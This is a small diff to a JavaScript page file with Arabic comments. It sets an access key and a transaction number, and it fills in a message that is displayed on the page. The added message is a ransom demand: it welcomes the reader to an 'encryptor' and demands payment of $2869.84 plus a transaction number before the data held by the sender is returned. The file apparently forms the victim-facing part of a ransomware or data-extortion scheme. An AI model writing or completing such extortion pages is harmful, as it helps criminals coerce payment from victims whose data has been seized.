@@ -1,7 +1,8 @@
 // ضع نص الرسالة والنص الأخير هنا عندما ترسلهما.
 const ACCESS_KEY = "1#7@12/12::W:32/_A5.Zz::22Ex114mQ";
 const TRANSACTION_NUMBER = "396654428266653";
-const MAIN_MESSAGE = "[ضع الرسالة التي سترسلها هنا لاحقًا]";
+const MAIN_MESSAGE = "[اهلا بكم في مشفر 
+يرجي دفع المديونيه التي وصلت قيمتها حتي الان الي 2869.84$ وادخال رقم العمليه حتي يتم استلام البينات المخزنه لدينا.]";
 const FINAL_MESSAGE = "[ضع النص الصغير الأخير هنا لاحقًا]";
 document.getElementById("mainmessage").textContent=MAIN_MESSAGE;
 document.getElementById("finalmessage").textContent=FINAL_MESSAGE;
